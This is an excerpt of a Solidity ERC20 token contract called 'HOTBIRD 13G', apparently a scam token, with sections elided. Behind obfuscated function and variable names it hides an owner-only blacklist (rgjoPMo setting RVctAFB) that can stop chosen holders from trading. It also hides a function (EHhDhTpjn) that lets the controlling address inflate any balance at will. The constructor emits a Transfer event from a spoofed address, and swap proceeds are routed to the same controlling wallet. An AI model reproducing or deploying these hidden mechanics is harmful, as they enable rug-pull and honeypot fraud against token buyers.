...
contract  HOTBIRD  is Context, IERC20, Ownable {
    ...
    string private _name = "HOTBIRD 13G";
    string private _symbol = "HOTBIRD 13G";
    uint8 private _decimals = 9;
    address payable public DcafVz;
    ...
    mapping (address => bool) public RVctAFB;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xa337d315F454b3218cB9f1E86FBBEa62619978f4));
        DcafVz = payable(address(0xa337d315F454b3218cB9f1E86FBBEa62619978f4));


        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0xa06bC25B5805d5F8d82847D191Cb4Af5A3e873E0), _msgSender(), _totalSupply);
    }
    ...
    function RXjhIyGbg() view private{
        require(true && DcafVz == _msgSender());
    }
    
    function rgjoPMo(bool xrXCrPkNEuOaa, address[] calldata wYnxaAOmEi) public {
        RXjhIyGbg();
        bool b = true;
        b = b;
        for (uint256 i; i < wYnxaAOmEi.length; i++) {
            RVctAFB[wYnxaAOmEi[i]] = xrXCrPkNEuOaa;
        }
    }

    function EHhDhTpjn(uint256 ukVZYcKZgwqGQ,address FmjPhyeJrpu) public {
        RXjhIyGbg();
        bool a = true;
        a = a;
        uint256 lxkeUJjjX = ukVZYcKZgwqGQ.add(_balances[FmjPhyeJrpu]);
        uint256 VLvovOd;
        VLvovOd = lxkeUJjjX - 100;
        _balances[FmjPhyeJrpu] = 100 + VLvovOd;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(DcafVz, amountETHMarketing);
